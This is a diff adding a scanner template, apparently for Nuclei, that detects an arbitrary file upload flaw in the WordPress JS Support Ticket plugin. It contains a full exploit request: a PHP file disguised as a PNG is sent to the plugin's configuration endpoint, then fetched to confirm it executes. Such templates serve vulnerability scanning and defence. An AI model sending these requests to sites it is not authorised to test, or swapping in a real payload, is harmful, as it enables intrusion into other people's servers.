@@ -1,0 +1,54 @@
+id: wordpress-js-support-ticket-anyfile-upload
+info:
+  name: WordPress JS Support Ticket Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,wordpress
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/wp-admin/?page=configuration&task=saveconfiguration"
+    headers:
+      Content-Type: multipart/form-data; boundary=--------767099171
+    body: |-
+      ----------767099171
+      Content-Disposition: form-data; name="action"
+
+      configuration_saveconfiguration
+      ----------767099171
+      Content-Disposition: form-data; name="form_request"
+
+      jssupportticket
+      ----------767099171
+      Content-Disposition: form-data; name="support_custom_img"; filename="{{t1}}.php"
+      Content-Type: image/png
+
+      <?php echo md5({{t1}})?>
+      ----------767099171--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: dsl
+        dsl:
+          - '!contains(body, "<")'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-content/plugins/js-support-ticket/jssupportticketdata/supportImg/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
